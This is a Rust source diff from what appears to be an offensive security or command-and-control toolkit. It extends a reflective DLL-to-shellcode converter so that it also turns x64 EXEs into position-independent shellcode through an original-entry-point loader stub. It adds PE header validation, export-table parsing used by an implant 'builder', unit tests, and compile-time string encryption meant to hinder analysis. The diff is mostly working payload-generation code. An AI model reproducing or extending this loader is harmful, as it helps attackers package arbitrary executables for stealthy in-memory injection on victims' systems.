@@ -25,6 +25,7 @@
 use std::fmt;
 
 use crate::rdi_stub::RDI_STUB_X64;
+use crate::pe_stub::EXE_STUB_X64;
 use crate::strcrypt_rt;
 use strcrypt::aes_str;
 
@@ -39,6 +40,9 @@ pub const BOOTSTRAP_SIZE_X64: usize = 69;
 
 /// Length of the embedded x64 RDI loader stub in bytes.
 pub const RDI_STUB_LEN: usize = RDI_STUB_X64.len();
+
+/// Length of the embedded x64 EXE (OEP) loader stub in bytes.
+pub const EXE_STUB_LEN: usize = EXE_STUB_X64.len();
 
 // ── PE constants ────────────────────────────────────────────────────────────
 const E_LFANEW_OFFSET: usize = 0x3C;
@@ -119,8 +123,8 @@ fn read_u32_le(buf: &[u8], off: usize) -> Option<u32> {
         .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
 }
 
-/// Validate that `pe` is a 64-bit Windows DLL with intact headers.
-pub fn validate_x64_dll(pe: &[u8]) -> Result<(), ShellcodeError> {
+/// Validate that `pe` is a 64-bit Windows PE (EXE or DLL) with intact headers.
+pub fn validate_x64_pe(pe: &[u8]) -> Result<(), ShellcodeError> {
     if pe.len() < E_LFANEW_OFFSET + 4 {
         return Err(ShellcodeError::TooSmall);
     }
@@ -140,15 +144,84 @@ pub fn validate_x64_dll(pe: &[u8]) -> Result<(), ShellcodeError> {
     if machine != MACHINE_AMD64 {
         return Err(ShellcodeError::NotAmd64(machine));
     }
-    let characteristics = read_u16_le(pe, file_hdr + 18).ok_or(ShellcodeError::TruncatedHeaders)?;
-    if characteristics & IMAGE_FILE_DLL == 0 {
-        return Err(ShellcodeError::NotADll);
-    }
     let opt_magic = read_u16_le(pe, file_hdr + 20).ok_or(ShellcodeError::TruncatedHeaders)?;
     if opt_magic != OPTIONAL_MAGIC_PE32PLUS {
         return Err(ShellcodeError::NotPe32Plus(opt_magic));
     }
     Ok(())
+}
+
+/// Validate that `pe` is a 64-bit Windows DLL with intact headers.
+pub fn validate_x64_dll(pe: &[u8]) -> Result<(), ShellcodeError> {
+    validate_x64_pe(pe)?;
+    let pe_off = read_u32_le(pe, E_LFANEW_OFFSET).ok_or(ShellcodeError::TruncatedHeaders)? as usize;
+    let characteristics = read_u16_le(pe, pe_off + 4 + 18).ok_or(ShellcodeError::TruncatedHeaders)?;
+    if characteristics & IMAGE_FILE_DLL == 0 {
+        return Err(ShellcodeError::NotADll);
+    }
+    Ok(())
+}
+
+/// Map a PE RVA to a file offset via the section table. RVAs that fall
+/// inside the headers (before the first section) map 1:1.
+fn rva_to_offset(pe: &[u8], rva: u32) -> Option<usize> {
+    let pe_off = read_u32_le(pe, E_LFANEW_OFFSET)? as usize;
+    let file_hdr = pe_off + 4;
+    let num_sections = read_u16_le(pe, file_hdr + 2)? as usize;
+    let size_opt = read_u16_le(pe, file_hdr + 16)? as usize;
+    let sections = file_hdr.checked_add(20 + size_opt)?;
+    let rva = rva as usize;
+    for i in 0..num_sections {
+        let sh = sections.checked_add(i * 40)?;
+        // Section: VirtualAddress +12, SizeOfRawData +16, PointerToRawData +20.
+        let va = read_u32_le(pe, sh + 12)? as usize;
+        let raw_size = read_u32_le(pe, sh + 16)? as usize;
+        let raw_ptr = read_u32_le(pe, sh + 20)? as usize;
+        if rva >= va && rva < va + raw_size {
+            return raw_ptr.checked_add(rva - va).filter(|&o| o < pe.len());
+        }
+    }
+    if rva < sections && rva < pe.len() {
+        return Some(rva);
+    }
+    None
+}
+
+/// Collect the names listed in a PE's export table. An empty Vec means the
+/// PE has no export directory (or an empty one); callers decide whether
+/// that is an error for their use case. Used by the builder to prove the
+/// client_dll cdylib really exports DllMain before shipping it.
+pub fn pe_export_names(pe: &[u8]) -> Result<Vec<String>, ShellcodeError> {
+    validate_x64_pe(pe)?;
+    let pe_off = read_u32_le(pe, E_LFANEW_OFFSET).ok_or(ShellcodeError::TruncatedHeaders)? as usize;
+    let opt_hdr = pe_off + 4 + 20;
+    // Data directory 0 (export table) sits at offset 112 of the PE32+
+    // optional header.
+    let export_rva = read_u32_le(pe, opt_hdr + 112).ok_or(ShellcodeError::TruncatedHeaders)?;
+    if export_rva == 0 {
+        return Ok(Vec::new());
+    }
+    let dir_off = rva_to_offset(pe, export_rva).ok_or(ShellcodeError::TruncatedHeaders)?;
+    // IMAGE_EXPORT_DIRECTORY: NumberOfNames at +24, AddressOfNames at +32.
+    let num_names = read_u32_le(pe, dir_off + 24).ok_or(ShellcodeError::TruncatedHeaders)? as usize;
+    let names_rva = read_u32_le(pe, dir_off + 32).ok_or(ShellcodeError::TruncatedHeaders)?;
+    let names_off = rva_to_offset(pe, names_rva).ok_or(ShellcodeError::TruncatedHeaders)?;
+    // Cap the walk: a malformed table must not turn into an unbounded read.
+    let num_names = num_names.min(65536);
+    let mut out = Vec::with_capacity(num_names.min(64));
+    for i in 0..num_names {
+        let name_rva = read_u32_le(pe, names_off + i * 4).ok_or(ShellcodeError::TruncatedHeaders)?;
+        let name_off = rva_to_offset(pe, name_rva).ok_or(ShellcodeError::TruncatedHeaders)?;
+        let end = pe[name_off..]
+            .iter()
+            .position(|&b| b == 0)
+            .map(|p| name_off + p)
+            .ok_or(ShellcodeError::TruncatedHeaders)?;
+        let name = std::str::from_utf8(&pe[name_off..end])
+            .map_err(|_| ShellcodeError::TruncatedHeaders)?;
+        out.push(name.to_string());
+    }
+    Ok(out)
 }
 
 /// Convert a raw x64 DLL into position-independent shellcode.
@@ -160,9 +233,30 @@ pub fn convert_dll_to_shellcode(
     opts: &ShellcodeOptions,
 ) -> Result<Vec<u8>, ShellcodeError> {
     validate_x64_dll(dll)?;
+    Ok(assemble_shellcode(RDI_STUB_X64, dll, opts))
+}
 
+/// Convert a raw x64 PE (typically an EXE) into position-independent
+/// shellcode using the OEP loader stub (see src/pe_stub.rs).
+///
+/// Layout and 69-byte bootstrap are identical to the sRDI conversion; only
+/// the embedded loader stub differs: it maps the image and calls the
+/// ORIGINAL ENTRY POINT as `entry(rcx=image base, rdx=1, r8=NULL)` instead
+/// of DllMain / a hashed export. Any x64 PE (EXE or DLL) is accepted.
+pub fn convert_pe_to_shellcode(
+    pe: &[u8],
+    opts: &ShellcodeOptions,
+) -> Result<Vec<u8>, ShellcodeError> {
+    validate_x64_pe(pe)?;
+    Ok(assemble_shellcode(EXE_STUB_X64, pe, opts))
+}
+
+/// Shared bootstrap builder: 69-byte RIP-capturing bootstrap + loader stub
+/// + raw PE + user data. `stub` is either RDI_STUB_X64 (DLL) or
+/// EXE_STUB_X64 (EXE/OEP); the bootstrap only depends on the stub length.
+fn assemble_shellcode(stub: &[u8], dll: &[u8], opts: &ShellcodeOptions) -> Vec<u8> {
     let mut b: Vec<u8> = Vec::with_capacity(
-        BOOTSTRAP_SIZE_X64 + RDI_STUB_X64.len() + dll.len() + opts.user_data.len(),
+        BOOTSTRAP_SIZE_X64 + stub.len() + dll.len() + opts.user_data.len(),
     );
 
     // call $+5 - pushes RIP of the following instruction onto the stack
@@ -170,7 +264,7 @@ pub fn convert_dll_to_shellcode(
 
     // Offset from the pop below to the DLL image:
     //   remaining bootstrap bytes + loader stub
-    let dll_offset = (BOOTSTRAP_SIZE_X64 - b.len() + RDI_STUB_X64.len()) as u32;
+    let dll_offset = (BOOTSTRAP_SIZE_X64 - b.len() + stub.len()) as u32;
     let user_data_location = dll_offset + dll.len() as u32;
 
     b.push(0x59); // pop rcx - rcx = current RIP (shellcode base)
@@ -209,10 +303,10 @@ pub fn convert_dll_to_shellcode(
 
     debug_assert_eq!(b.len(), BOOTSTRAP_SIZE_X64, "{}", aes_str!("x64 bootstrap size drifted"));
 
-    b.extend_from_slice(RDI_STUB_X64);
+    b.extend_from_slice(stub);
     b.extend_from_slice(dll);
     b.extend_from_slice(&opts.user_data);
-    Ok(b)
+    b
 }
 
 // ── Output encodings ────────────────────────────────────────────────────────
@@ -423,6 +517,66 @@ mod tests {
         );
     }
 
+    /// Same header as fake_dll but with IMAGE_FILE_DLL cleared (an EXE).
+    fn fake_exe(size: usize) -> Vec<u8> {
+        let mut d = fake_dll(size);
+        let fh = 0x80 + 4;
+        // Characteristics: executable | large-address-aware (no DLL bit)
+        d[fh + 18..fh + 20].copy_from_slice(&(0x0002u16 | 0x0020).to_le_bytes());
+        d
+    }
+
+    #[test]
+    fn pe_shellcode_layout_matches_bootstrap_stub_pe_userdata() {
+        let pe = fake_exe(1000);
+        let opts = ShellcodeOptions {
+            function_hash: 0x10,
+            user_data: b"UDAT".to_vec(),
+            flags: 0,
+        };
+        let sc = convert_pe_to_shellcode(&pe, &opts).unwrap();
+        let stub_end = BOOTSTRAP_SIZE_X64 + EXE_STUB_X64.len();
+        assert_eq!(sc.len(), stub_end + pe.len() + 4);
+        // byte 69 = first byte of the EXE stub (push r15)
+        assert_eq!(&sc[BOOTSTRAP_SIZE_X64..BOOTSTRAP_SIZE_X64 + 2], &[0x41, 0x57]);
+        // PE starts right after the stub, user data is the trailer
+        assert_eq!(&sc[stub_end..stub_end + 2], b"MZ");
+        assert_eq!(&sc[sc.len() - 4..], b"UDAT");
+    }
+
+    #[test]
+    fn pe_shellcode_bootstrap_immediates_use_exe_stub_len() {
+        let pe = fake_exe(1000);
+        let opts = ShellcodeOptions::default();
+        let sc = convert_pe_to_shellcode(&pe, &opts).unwrap();
+
+        let pe_offset = (BOOTSTRAP_SIZE_X64 - 5 + EXE_STUB_X64.len()) as u32;
+        // add rcx, <pe offset> (opcode at 44, imm at 47)
+        assert_eq!(&sc[44..47], &[0x48, 0x81, 0xC1]);
+        assert_eq!(read_u32_le(&sc, 47), Some(pe_offset));
+
+        // call stub: E8 at 59, rel32 at 60; target = 59+5+rel must be 69
+        assert_eq!(sc[59], 0xE8);
+        let rel = read_u32_le(&sc, 60).unwrap() as i32;
+        assert_eq!(64 + rel, BOOTSTRAP_SIZE_X64 as i32);
+    }
+
+    #[test]
+    fn pe_shellcode_accepts_both_exe_and_dll() {
+        assert!(convert_pe_to_shellcode(&fake_exe(512), &ShellcodeOptions::default()).is_ok());
+        assert!(convert_pe_to_shellcode(&fake_dll(512), &ShellcodeOptions::default()).is_ok());
+        assert_eq!(
+            convert_pe_to_shellcode(b"short", &ShellcodeOptions::default()),
+            Err(ShellcodeError::TooSmall)
+        );
+    }
+
+    #[test]
+    fn validate_x64_pe_accepts_exe_where_dll_validator_rejects() {
+        assert!(validate_x64_pe(&fake_exe(512)).is_ok());
+        assert_eq!(validate_x64_dll(&fake_exe(512)), Err(ShellcodeError::NotADll));
+    }
+
     #[test]
     fn base64_known_vectors() {
         assert_eq!(encode_base64(b""), "");
@@ -441,5 +595,56 @@ mod tests {
         assert!(c.starts_with("unsigned char sc[] = {\n"));
         assert!(c.contains("0x41, 0x42,"));
         assert!(c.ends_with("unsigned int sc_len = 2;\n"));
+    }
+
+    /// fake_dll plus one section and an export table carrying `names`.
+    /// Layout: section .edata maps RVA 0x1000..0x1200 to file 0x200..0x400;
+    /// export dir at RVA 0x1000, name-pointer array at 0x1040, strings from
+    /// 0x1060.
+    fn fake_dll_with_exports(names: &[&str]) -> Vec<u8> {
+        let mut d = fake_dll(1024);
+        let fh = 0x80 + 4;
+        d[fh + 2..fh + 4].copy_from_slice(&1u16.to_le_bytes()); // 1 section
+        d[fh + 16..fh + 18].copy_from_slice(&0xF0u16.to_le_bytes()); // sizeof opt hdr
+        let sh = fh + 20 + 0xF0;
+        d[sh + 12..sh + 16].copy_from_slice(&0x1000u32.to_le_bytes()); // VirtualAddress
+        d[sh + 16..sh + 20].copy_from_slice(&0x200u32.to_le_bytes()); // SizeOfRawData
+        d[sh + 20..sh + 24].copy_from_slice(&0x200u32.to_le_bytes()); // PointerToRawData
+        let opt = fh + 20;
+        d[opt + 112..opt + 116].copy_from_slice(&0x1000u32.to_le_bytes()); // export dir RVA
+        d[0x200 + 24..0x200 + 28].copy_from_slice(&(names.len() as u32).to_le_bytes());
+        d[0x200 + 32..0x200 + 36].copy_from_slice(&0x1040u32.to_le_bytes());
+        let mut cur_rva = 0x1060usize;
+        for (i, n) in names.iter().enumerate() {
+            d[0x240 + i * 4..0x240 + i * 4 + 4].copy_from_slice(&(cur_rva as u32).to_le_bytes());
+            let off = cur_rva - 0x1000 + 0x200;
+            d[off..off + n.len()].copy_from_slice(n.as_bytes());
+            cur_rva += n.len() + 1;
+        }
+        d
+    }
+
+    #[test]
+    fn export_names_parsed_from_export_table() {
+        let d = fake_dll_with_exports(&["DllMain", "Run"]);
+        assert_eq!(
+            pe_export_names(&d).unwrap(),
+            vec!["DllMain".to_string(), "Run".to_string()]
+        );
+    }
+
+    #[test]
+    fn export_names_empty_when_no_export_directory() {
+        // fake_dll has all-zero data directories (export RVA = 0).
+        assert!(pe_export_names(&fake_dll(512)).unwrap().is_empty());
+    }
+
+    #[test]
+    fn export_names_err_on_non_pe_and_dangling_table() {
+        assert!(pe_export_names(b"not a pe").is_err());
+        let mut d = fake_dll_with_exports(&["DllMain"]);
+        // Point AddressOfNames outside every section and the headers.
+        d[0x200 + 32..0x200 + 36].copy_from_slice(&0x5000u32.to_le_bytes());
+        assert!(pe_export_names(&d).is_err());
     }
 }
